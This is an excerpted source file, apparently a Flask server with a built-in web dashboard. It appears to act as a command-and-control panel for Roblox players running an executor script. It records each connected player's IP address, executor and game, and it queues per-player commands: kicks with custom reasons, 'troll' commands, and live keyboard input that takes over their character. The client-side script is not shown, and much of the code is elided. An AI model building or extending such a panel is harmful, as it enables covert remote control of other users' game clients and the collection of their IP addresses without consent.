...
def access_denied(e):
    ...
    return f"<html><body style='background:#000;color:#ff3366;font-family:Arial;text-align:center;padding-top:15%;'><h1>Accès refusé</h1><p>Ton IP : <b>{detected}</b></p></body></html>", 403
...
<style>
*{box-sizing:border-box;margin:0;padding:0} body{font-family:Inter,sans-serif;background:radial-gradient(circle at top,#0f2027,#000);color:#fff;min-height:100vh}
.container{max-width:1200px;margin:auto;padding:40px} h1{font-family:Orbitron;font-size:3.5rem;text-align:center;color:#00ffaa;text-shadow:0 0 30px #00ffaa;margin-bottom:20px}
.stats{text-align:center;margin:30px 0;font-size:1.8rem} .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:25px} .card{background:rgba(20,20,20,.9);border-radius:18px;padding:25px;box-shadow:0 0 30px rgba(0,0,0,.7);transition:transform .3s}
.card:hover{transform:translateY(-8px)} .status{display:flex;align-items:center;gap:10px;margin-bottom:15px} .dot{width:14px;height:14px;border-radius:50%;background:red;box-shadow:0 0 12px red}
.dot.online{background:#00ffaa;box-shadow:0 0 18px #00ffaa} .name{font-size:1.8rem;font-weight:600;color:#ffcc00;margin-bottom:10px}
.name a{color:#ffcc00;text-decoration:none} .name a:hover{text-decoration:underline} .info{font-size:1rem;color:#aaa;margin-bottom:20px;line-height:1.5}
.category{font-weight:bold;color:#00ffaa;margin:15px 0 10px;font-size:1.1rem} button.kick-btn{padding:12px;border:none;border-radius:12px;cursor:pointer;font-weight:bold;font-size:0.95rem;color:white;transition:transform .2s;margin-bottom:8px}
button.kick-btn:hover{transform:scale(1.05)} button.kick-btn:disabled{background:#444 !important;cursor:not-allowed;transform:none}
...
.modal.active{display:flex} .modal-content{background:#111;padding:30px;border-radius:20px;width:90%;max-width:500px;box-shadow:0 0 40px rgba(255,51,102,0.5)}
.modal-content h2{text-align:center;color:#ff3366;margin-bottom:20px} .modal-content input{width:100%;padding:15px;border-radius:12px;border:none;background:#222;color:white;font-size:1.1rem;margin-bottom:20px}
.modal-buttons{display:flex;gap:15px} .modal-buttons button{flex:1;padding:14px;border:none;border-radius:12px;font-weight:bold;cursor:pointer}
.confirm-btn{background:linear-gradient(45deg,#ff3366,#ff5588);color:white} .cancel-btn{background:#444;color:white} .toast-container{position:fixed;bottom:25px;right:25px;z-index:999}
...
function toast(msg, type="success"){const t=document.createElement("div");t.className="toast "+(type==="danger"?"danger":"");t.textContent=msg;document.getElementById("toasts").appendChild(t);setTimeout(()=>t.remove(),5000);}
...
function performKick(){if(!currentKickId) return;const reason=document.getElementById("kickReason").value.trim()||"Kicked by admin";fetch("/kick",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:currentKickId,reason:reason})});toast(`Kick sent`,"danger");closeModal();}
function sendTroll(id,cmd){fetch("/troll",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userid:id,cmd:cmd})});toast(`${cmd.toUpperCase()} sent`,"danger");}
...
<div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: <a style="color:#aaa" href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank">${p.gameName}</a> <br>JobId: ${p.jobId}</div>
...
document.addEventListener("keydown",(e)=>{if(!controllerActive) return;const key=keysMap[e.code];if(key) socket.emit("controller_input",{userid:userid,key:key,state:true});});
document.addEventListener("keyup",(e)=>{if(!controllerActive) return;const key=keysMap[e.code];if(key) socket.emit("controller_input",{userid:userid,key:key,state:false});});
</script>
</body>
</html>
"""
...
def api():
    ...
    if request.method=="POST":
        ...
        if d.get("action")=="register":
            connected_players[uid] = {
                ...
                "ip": d.get("ip","Unknown"),
                "gameName": d.get("gameName","Unknown"),
    ...
    if request.method=="GET":
        ...
        if uid in pending_kicks:
            ret["command"] = "kick"
            ret["reason"] = pending_kicks.pop(uid)
        elif uid in pending_commands:
            ret["command"] = pending_commands.pop(uid)
        if uid in controller_states:
            ret["controller"] = controller_states[uid]
...
def handle_controller(data):
    ...
    if uid not in controller_states:
        controller_states[uid]={"Z":False,"S":False,"Q":False,"D":False,"Space":False}
    if key in controller_states[uid]:
        controller_states[uid][key]=state
